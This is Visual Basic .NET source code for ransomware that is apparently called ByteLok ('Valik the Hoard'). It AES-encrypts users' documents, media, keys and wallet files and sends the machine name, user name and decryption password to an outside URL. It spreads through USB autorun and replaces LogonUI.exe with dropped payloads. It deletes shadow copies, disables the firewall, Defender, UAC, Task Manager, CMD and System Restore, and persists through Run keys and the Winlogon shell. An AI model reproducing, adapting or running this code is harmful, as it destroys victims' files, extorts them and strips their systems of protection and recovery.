Imports System.IO
Imports System.Net
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Security.AccessControl
Imports System.Security.Cryptography
Imports System.Text
Imports Microsoft.Win32

Public Class Valik

    Private ReadOnly darknet As String = "http://ysasite.com/happy/kunjungi.php?masuk="
    Private ReadOnly usercall As String = Environment.UserName
    Private ReadOnly machina As String = Environment.MachineName.ToString()
    Private ReadOnly currentuser As String = "C:\Users\"

    Private ReadOnly imagepath As String = "C:\Users\rytho\source\repos\ByteLok\ByteLok\Opera Snapshot_2024-11-18_172423_www.google.com.bmp"
    Dim Key As RegistryKey

    Public Sub New()
        InitializeComponent()
        TransparencyKey = BackColor
        TopMost = True
        Opacity = 1.0
        'Admin takedown
        Call Process.Start(New ProcessStartInfo With {
    .FileName = "cmd.exe",
    .WindowStyle = ProcessWindowStyle.Hidden,
    .Arguments = "/k takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant ""%username%:F"""
})       'Disable task manager
        Dim registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
        registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String)
    End Sub

    Private Sub AddDirectorySecurity(FileName As String, Account As String, Rights As FileSystemRights, ControlType As AccessControlType)
        Dim di As New DirectoryInfo(FileName)
        Dim ds As DirectorySecurity = di.GetAccessControl()
        ds.AddAccessRule(New FileSystemAccessRule(Account, Rights, ControlType))
        di.SetAccessControl(ds)
    End Sub


    'Copy & Autorun to USB
    Public Sub Infect_Strain()
        Dim usbs As String = My.Computer.FileSystem.SpecialDirectories.ProgramFiles
        Dim driver() As String = (Directory.GetLogicalDrives)
        For Each usbs In driver
            Try
                File.Copy(Application.ExecutablePath, usbs & "Valik_The_Hoard.exe")
                Dim AutoStart = New StreamWriter(usbs & "\autorun.inf")
                AutoStart.WriteLine("[autorun]")
                AutoStart.WriteLine("open=" & usbs & "Valik_The_Hoard.exe")
                AutoStart.WriteLine("shellexecute=" & usbs, 1)
                AutoStart.Close()
                File.SetAttributes(usbs & "autorun.inf", FileAttributes.Hidden)
                File.SetAttributes(usbs & "Valik_The_Hoard.exe", FileAttributes.Hidden)
            Catch ex As Exception

            End Try
        Next
    End Sub

    Private Sub Valik_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ' cmd_get.Start()
        ' Tmr_start_worm.Start()
        ' Registrys()
        ' PriorityClass()
        Dim DirectoryName As String = Assembly.GetExecutingAssembly().Location
        AddDirectorySecurity(DirectoryName, "WORKGROUPS\RYTHORIAN", FileSystemRights.ReadData, AccessControlType.Allow)
        Infect_Strain()
        EnableCriticalProcess()
        FolderSet()
        Dim returncode As Integer
        returncode = SystemParametersInfo(20, 0, imagepath, 0)
        Key = Registry.CurrentUser.OpenSubKey("Control Panel", True)
        Try
            Key = Key.OpenSubKey("Desktop", True)
            Key.SetValue("Wallpaper", imagepath)
        Catch
            Debug.WriteLine("error")
        End Try

    End Sub

    'Caution Below Code: if you are asking for true realtime priority, you are going to get it. This is a nuke.
    'The OS will mercilessly prioritize a realtime priority thread, well above even OS-level input processing,
    'disk-cache flushing, and other high-priority time-critical tasks. You can easily lock up your entire system
    'if your realtime thread(s) drain your CPU capacity. Be cautious when doing this, and unless absolutely necessary,
    'consider using high-priority instead. 
    Public Sub PriorityClass()
        SetPriorityClass(ProcessPriorityClass.AboveNormal) 'AboveNormal is fine
    End Sub
    Public Sub SetPriorityClass(Priority As ProcessPriorityClass)
        Dim Process As Process = Process.GetCurrentProcess
        Process.PriorityClass = Priority
    End Sub


    ' Token: 0x06000003 RID: 3 RVA: 0x00002104 File Offset: 0x00000304
    Public Shared Sub Extract([nameSpace] As String, outDirectory As String, internalFilePath As String, resourceName As String)
        Dim callingAssembly As Assembly = Assembly.GetCallingAssembly()
        Using manifestResourceStream = callingAssembly.GetManifestResourceStream([nameSpace] & "." & If(Equals(internalFilePath, ""), "", internalFilePath & ".") & resourceName)
            Using binaryReader As New BinaryReader(manifestResourceStream)
                Using fileStream As New FileStream(outDirectory & "\" & resourceName, FileMode.OpenOrCreate)
                    Using binaryWriter As New BinaryWriter(fileStream)
                        binaryWriter.Write(binaryReader.ReadBytes(manifestResourceStream.Length))
                    End Using
                End Using
            End Using
        End Using
    End Sub

    ' Token: 0x06000004 RID: 4 RVA: 0x000021EC File Offset: 0x000003EC
    Private Sub Cmd_get_Tick(sender As Object, e As EventArgs)
        Cmd_get.Stop()
        Dim environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE")
        Dim text = Path.Combine(environmentVariable, "Downloads")
        Dim text2 = text
        Extract("SysWOW64", "C:\Windows\System32", "Script", "LogonUIinf.exe")
        Extract("SysWOW64", "C:\Windows\System32", "Script", "ransom_voice.vbs")
        Extract("SysWOW64", "C:\Windows\System32", "Script", "WormLocker2.0.exe")
        File.Copy("C:\Windows\System32\LogonUI.exe", "C:\Windows\System32\LogonUItrue.exe")
        File.Delete("C:\Windows\System32\LogonUI.exe")
        File.Copy("C:\Windows\System32\LogonUIinf.exe", "C:\Windows\System32\LogonUI.exe")
        Dim folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        Dim array As String() = (From f In Directory.EnumerateFiles(folderPath & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
        For Each path In array
            File.Delete(path)
        Next
        Dim str = text2
        Dim array3 As String() = (From f In Directory.EnumerateFiles(str & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
        For Each path2 In array3
            File.Delete(path2)
        Next
        Dim text3 = "A:\"
        Dim text4 = "B:\"
        Dim text5 = "D:\"
        Dim text6 = "E:\"
        Dim text7 = "F:\"
        Dim text8 = "G:\"
        Dim text9 = "H:\"
        Dim text10 = "I:\"
        Dim text11 = "J:\"
        Dim text12 = "K:\"
        Dim text13 = "L:\"
        Dim text14 = "M:\"
        Dim text15 = "O:\"
        Dim text16 = "P:\"
        Dim text17 = "Q:\"
        Dim text18 = "R:\"
        Dim text19 = "S:\"
        Dim text20 = "T:\"
        Dim text21 = "U:\"
        Dim flag = Directory.Exists(text3)
        If flag Then
            Dim array5 As String() = (From f In Directory.EnumerateFiles(text3 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path3 In array5
                File.Delete(path3)
            Next
        End If
        Dim flag2 = Directory.Exists(text4)
        If flag2 Then
            Dim array7 As String() = (From f In Directory.EnumerateFiles(text4 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path4 In array7
                File.Delete(path4)
            Next
        End If
        Dim flag3 = Directory.Exists(text5)
        If flag3 Then
            Dim array9 As String() = (From f In Directory.EnumerateFiles(text5 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path5 In array9
                File.Delete(path5)
            Next
        End If
        Dim flag4 = Directory.Exists(text6)
        If flag4 Then
            Dim array11 As String() = (From f In Directory.EnumerateFiles(text6 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path6 In array11
                File.Delete(path6)
            Next
        End If
        Dim flag5 = Directory.Exists(text7)
        If flag5 Then
            Dim array13 As String() = (From f In Directory.EnumerateFiles(text7 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path7 In array13
                File.Delete(path7)
            Next
        End If
        Dim flag6 = Directory.Exists(text8)
        If flag6 Then
            Dim array15 As String() = (From f In Directory.EnumerateFiles(text8 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path8 In array15
                File.Delete(path8)
            Next
        End If
        Dim flag7 = Directory.Exists(text9)
        If flag7 Then
            Dim array17 As String() = (From f In Directory.EnumerateFiles(text9 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path9 In array17
                File.Delete(path9)
            Next
        End If
        Dim flag8 = Directory.Exists(text10)
        If flag8 Then
            Dim array19 As String() = (From f In Directory.EnumerateFiles(text10 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path10 In array19
                File.Delete(path10)
            Next
        End If
        Dim flag9 = Directory.Exists(text11)
        If flag9 Then
            Dim array21 As String() = (From f In Directory.EnumerateFiles(text11 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path11 In array21
                File.Delete(path11)
            Next
        End If
        Dim flag10 = Directory.Exists(text12)
        If flag10 Then
            Dim array23 As String() = (From f In Directory.EnumerateFiles(text12 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path12 In array23
                File.Delete(path12)
            Next
        End If
        Dim flag11 = Directory.Exists(text13)
        If flag11 Then
            Dim array25 As String() = (From f In Directory.EnumerateFiles(text13 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path13 In array25
                File.Delete(path13)
            Next
        End If
        Dim flag12 = Directory.Exists(text14)
        If flag12 Then
            Dim array27 As String() = (From f In Directory.EnumerateFiles(text14 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path14 In array27
                File.Delete(path14)
            Next
        End If
        Dim flag13 = Directory.Exists(text15)
        If flag13 Then
            Dim array29 As String() = (From f In Directory.EnumerateFiles(text15 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path15 In array29
                File.Delete(path15)
            Next
        End If
        Dim flag14 = Directory.Exists(text16)
        If flag14 Then
            Dim array31 As String() = (From f In Directory.EnumerateFiles(text16 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path16 In array31
                File.Delete(path16)
            Next
        End If
        Dim flag15 = Directory.Exists(text17)
        If flag15 Then
            Dim array33 As String() = (From f In Directory.EnumerateFiles(text17 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path17 In array33
                File.Delete(path17)
            Next
        End If
        Dim flag16 = Directory.Exists(text18)
        If flag16 Then
            Dim array35 As String() = (From f In Directory.EnumerateFiles(text18 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path18 In array35
                File.Delete(path18)
            Next
        End If
        Dim flag17 = Directory.Exists(text19)
        If flag17 Then
            Dim array37 As String() = (From f In Directory.EnumerateFiles(text19 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path19 In array37
                File.Delete(path19)
            Next
        End If
        Dim flag18 = Directory.Exists(text20)
        If flag18 Then
            Dim array39 As String() = (From f In Directory.EnumerateFiles(text20 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path20 In array39
                File.Delete(path20)
            Next
        End If
        Dim flag19 = Directory.Exists(text21)
        If flag19 Then
            Dim array41 As String() = (From f In Directory.EnumerateFiles(text21 & "\") Where (New FileInfo(CStr(f)).Attributes And FileAttributes.Hidden) = FileAttributes.Hidden Select f).ToArray()
            For Each path21 In array41
                File.Delete(path21)
            Next
        End If
    End Sub

    ' Token: 0x06000005 RID: 5 RVA: 0x00002C62 File Offset: 0x00000E62
    Private Sub tmr_start_worm_Tick(sender As Object, e As EventArgs)
        Tmr_start_worm.Stop()
        Process.Start("C:\Windows\System32\WormLocker2.0.exe")
        MyBase.Close()
        Application.[Exit]()
    End Sub


    <DllImport("user32")>
    Private Shared Function _
    SystemParametersInfo(uAction As Integer, uParam As Integer,
lpvParam As String, fuWinIni As Integer) As Integer
        ' Leave the body of the function empty.
    End Function

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Application.Exit()

    End Sub

    Public Function AES_Encrypt(bytesToBeEncrypted As Byte(), passwordBytes As Byte()) As Byte()
        Dim encryptedBytes As Byte() = Nothing

        Using streamdream As New MemoryStream()
            Using AES As New RijndaelManaged()
                AES.KeySize = 256
                AES.BlockSize = 128

                Dim saltyBytes = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
                Dim key = New Rfc2898DeriveBytes(passwordBytes, saltyBytes, 1000)
                AES.Key = key.GetBytes(AES.KeySize / 8)
                AES.IV = key.GetBytes(AES.BlockSize / 8)

                AES.Mode = CipherMode.CBC

                Using cs = New CryptoStream(streamdream, AES.CreateEncryptor(), CryptoStreamMode.Write)
                    cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length)
                    cs.Close()
                End Using
                encryptedBytes = streamdream.ToArray()
            End Using
        End Using

        Return encryptedBytes
    End Function

    Public Function PassKeyDominion(length As Integer) As String
        Const passlist = "abcdefghijklmnopqrstuvwxyz*!=&?&/ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_VALIK_THE_HOARD"
        Dim builder As New StringBuilder()
        Dim rnd As New Random()
        While 0 < Math.Max(Threading.Interlocked.Decrement(length), length + 1)
            builder.Append(passlist(rnd.Next(passlist.Length)))
        End While
        Return builder.ToString()
    End Function

    Public Sub Worm(purge As String)

        Dim net = $"{machina}-{usercall} {purge}"
        Dim url = $"{darknet}{net}"
        Dim connect = New WebClient().DownloadString(url)
    End Sub

    Public Sub Encrypto(broker As String, passworm As String)

        Dim mark = File.ReadAllBytes(broker)
        Dim passbyte = Encoding.UTF8.GetBytes(passworm)
        passbyte = SHA256.Create().ComputeHash(passbyte)
        Dim cripple = AES_Encrypt(mark, passbyte)

        File.WriteAllBytes(broker, cripple)
        File.Move(broker, broker & ".ByteLok")
    End Sub

    Public Sub SoulCollector(risen As String, ringleader As String)
        Dim Feast = {".mid", ".wma", ".flv", ".mkv", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf", ".wav", ".qcow2", ".vdi", ".vmdk", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".tar.bz2", ".tbk", ".bak", ".tar", ".tgz", ".rar", ".zip", ".djv", ".djvu", ".svg", ".bmp", ".png", ".gif", ".raw", ".cgm", ".jpeg", ".jpg", ".tif", ".tiff", ".NEF", ".psd", ".cmd", ".class", ".jar", ".java", ".asp", ".brd", ".sch", ".dch", ".dip", ".vbs", ".asm", ".pas", ".cpp", ".php", ".ldf", ".mdf", ".ibd", ".MYI", ".MYD", ".frm", ".odb", ".dbf", ".mdb", ".sql", ".SQLITEDB", ".SQLITE3", ".asc", ".lay6", ".lay", ".ms11 (Security copy)", ".sldm", ".sldx", ".ppsm", ".ppsx", ".ppam", ".docb", ".mml", ".sxm", ".otg", ".odg", ".uop", ".potx", ".potm", ".pptx", ".pptm", ".std", ".sxd", ".pot", ".pps", ".sti", ".sxi", ".otp", ".odp", ".wks", ".xltx", ".xltm", ".xlsx", ".xlsm", ".xlsb", ".slk", ".xlw", ".xlt", ".xlm", ".xlc", ".dif", ".stc", ".sxc", ".ots", ".ods", ".hwp", ".dotm", ".dotx", ".docm", ".docx", ".DOT", ".max", ".xml", ".txt", ".CSV", ".uot", ".RTF", ".pdf", ".XLS", ".PPT", ".stw", ".sxw", ".ott", ".odt", ".DOC", ".pem", ".csr", ".crt", ".key", ".mp3", ".html", ".css", ".mp4", "wallet.dat"}
        Try
            Dim blade = Directory.GetFiles(risen)
            Dim devour = Directory.GetDirectories(risen)
            For i = 0 To blade.Length - 1
                Dim murk = Path.GetExtension(blade(i))
                If Feast.Contains(murk) Then
                    Encrypto(blade(i), ringleader)
                End If
            Next
            For i = 0 To devour.Length - 1
                SoulCollector(devour(i), ringleader)
            Next
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try

    End Sub

    Public Sub FolderSet()
        Dim pass = PassKeyDominion(12)
        Dim foldershark = "\Desktop\Crawler"
        Dim sync = currentuser & usercall & foldershark
        Worm(pass)

        Dim user = currentuser & usercall
        Dim fileArray = Directory.GetDirectories(user)
        For i = 0 To fileArray.Length - 1
            'Environ("USERPROFILE") & "\AppData\Local"

            Try
                Dim callboard = {"Videos", "Music", "Pictures", "Documents"}
                If callboard.Any(New Func(Of String, Boolean)(AddressOf fileArray(i).Contains)) Then
                    'Console.Write(fileArray[i] + "\n");
                    SoulCollector(fileArray(i), pass)
                End If

            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try

        Next
        pass = Nothing
        Application.[Exit]()
    End Sub

    <DllImport("ntdll.dll", SetLastError:=True)>
    Private Shared Function NtSetInformationProcess(hProcess As IntPtr, processInformationClass As Integer, ByRef processInformation As Integer, processInformationLength As Integer) As Integer
    End Function

    Public Shared Sub EnableCriticalProcess() ' protect process
        Dim isCritical As Integer = 1
        ' we want this to be a Critical Process
        Dim BreakOnTermination As Integer = &H1D
        ' value for BreakOnTermination (flag)
        Try
            Process.EnterDebugMode()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try

        'acquire Debug Privileges
        ' setting the BreakOnTermination = 1 for the current process
        NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, isCritical, 4)
    End Sub
    Public Shared Sub DisableCriticalProcess()
        Dim isCritical As Integer = 0
        ' we want this to be a Critical Process
        Dim BreakOnTermination As Integer = &H1D
        ' value for BreakOnTermination (flag)
        Process.EnterDebugMode()
        'acquire Debug Privileges
        ' setting the BreakOnTermination = 1 for the current process
        NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, isCritical, 4)
    End Sub
    Public Shared ReadOnly HWND_BROADCAST As New IntPtr(&HFFFF)
    Public Const WM_SETTINGCHANGE As Integer = &H1A 'it should be &H001A

    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property

    'Targets Registry Hive "Current & Local Machine"
    Public Sub Registrys()

        'Inserts application into registry hive to run on next startup>>>>
        My.Computer.Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
        My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
        My.Computer.Registry.LocalMachine.OpenSubKey("Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
        'End of Hive>>>>>
        'Delete admin shadow copy>>>
        Shell("vssadmin delete shadows /all /quiet", AppWinStyle.Hide)
        Shell("vssadmin delete shadows /all /quiet", AppWinStyle.Hide)
        Shell("vssadmin delete shadows /all /quiet", AppWinStyle.Hide)
        'End of shadow>>>>
        'To turn off the Windows Firewall for all profiles, you can use the command netsh advfirewall set allprofiles
        'state off in an elevated command prompt or PowerShell
        Shell("NetSh Advfirewall set allprofiles state off", vbHide)

        Dim RegistryKey As Object
        RegistryKey = CreateObject("WScript.Shell")
        'Disable | Remove Windows Defender Completely from the registry Targeted System, creating a safe environment for this programs malicious behaviour
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\DisableRealtimeMonitoring", 1, "REG_WORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiVirus", 1, "REG_WORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\DisableSpecialRunningModes", 1, "REG_WORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\ServiceKeepAlive", 0, "REG_WORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring", 1, "REG_WORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection", 1, "REG_WORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScanOnRealtimeEnable", 1, "REG_WORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring", 1, "REG_WORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet\DisableBlockAtFirstSeen", 1, "REG_WORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates", 1, "REG_WORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\ForceUpdateFromMU", 0, "REG_WORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\DisableRoutinelyTakingAction", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\WindowsDefenderMAJ", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\WindowsDefenderMAJ", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services\WdNisSvc", 3, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc", 3, "REG_DWORD")
        RegistryKey.regwrite("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services\WinDefend", 3, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend", 3, "REG_DWORD")
        'End of Windows Defender Removal from registry

        'Refers to a registry key on a Windows system that controls whether the Windows Script Host (WSH) is enabled for the currently
        'logged-in user, with a value of "0" meaning WSH is disabled; essentially, this registry entry allows you to prevent users from running
        'scripts like .vbs files on their system by setting it to "0". >>>>
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings\Enabled", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Script Host\Settings\Enabled", 0, "REG_DWORD")
        'End>>>>

        'A registry key that disables System Restore:>>>
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\SystemRestore\DisableConfig", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\SystemRestore\DisableConfig", 1, "REG_DWORD")
        'End>>>>>

        'Disable USB storage devices on a Windows computer, you can set the Start value in the registry key
        'Makes restoring your system impossible for targeted host
        RegistryKey.regwrite("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services\USBSTOR", 4, "REG_DWORD") 'Normally 4
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR", 4, "REG_DWORD") 'Normally 4
        'End>>>>

        'Disable Task Manager
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
        'End>>>>

        'Disable CMD (Command Prompt)
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\DisableCMD", 2, "REG_DWORD") 'Normally 2
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\System\DisableCMD", 2, "REG_DWORD") 'Normally 2
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\DisableCMD", 2, "REG_DWORD") 'Normally 2
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\DisableCMD", 2, "REG_DWORD") 'Normally 2
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System\DisableCMD", 2, "REG_DWORD") 'Normally 2
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\DisableCMD", 2, "REG_DWORD") 'Normally 2
        'End CMD>>>

        'GPO Policy Lock from Administrators (Non-Domain) | prevent a user with administrative rights from changing this.
        'Also account are all local no domain.
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}\Restrict_Run", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}\Restrict_Run", 1, "REG_DWORD")
        'End GPO Policy>>>

        'Windows Security has seven areas that protect your device and let you specify how you want your device protected:
        'Virus & threat protection - Has information And access To antivirus ransomware protection settings And notifications,
        'including the Controlled folder access feature of Windows Defender Exploit Guard And sign-in to Microsoft OneDrive.
        'Account protection - Makes it easier For users To protect their identity When signing In To Windows With the New Account Protection
        'pillar In Windows Security. Account Protection will encourage password users To Set up Windows Hello Face, Fingerprint Or PIN For faster
        'sign In, And will notify Dynamic lock users if Dynamic lock has stopped working because their phone Or device Bluetooth Is off.
        'Firewall & network protection - Has information And access To firewall settings, including Windows Defender Firewall.
        'App & browser control - Windows Defender SmartScreen settings And Exploit protection mitigations.
        'Device Security - Provides access to built-in device security settings.
        'Device performance & health - Has information about drivers, storage space, And general Windows Update issues.
        'Family options - Includes access to parental controls along with tips And information for keeping kids safe online.
        RegistryKey.regwrite("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services\SecurityHealthService", 4, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService", 4, "REG_DWORD")
        'End Windows Ssecurity>>>

        ' The policy EnableLUA with a value of "0" disables user account control and application notifications
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 0, "REG_DWORD")
        'End>>>

        'Used to disable the Control Panel in Windows: 
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", 1, "REG_DWORD")
        'End>>>

        'Used to load drivers and services by name or group. The Minimal subkey is used for Safe Boot mode without networking.
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot\Minimal\MinimalX", 1, "REG_DWORD")
        'End>>>

        'Modifies the Windows registry to remove the Run command from the Start menu and the New Task (Run) command from the Task Manager:
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD")
        'End>>>

        'Applications order to start at reboot
        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", True)
        key.SetValue("Shell", Application.ExecutablePath)
    End Sub


    Private Sub Valik_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        DisableCriticalProcess()
    End Sub
End Class
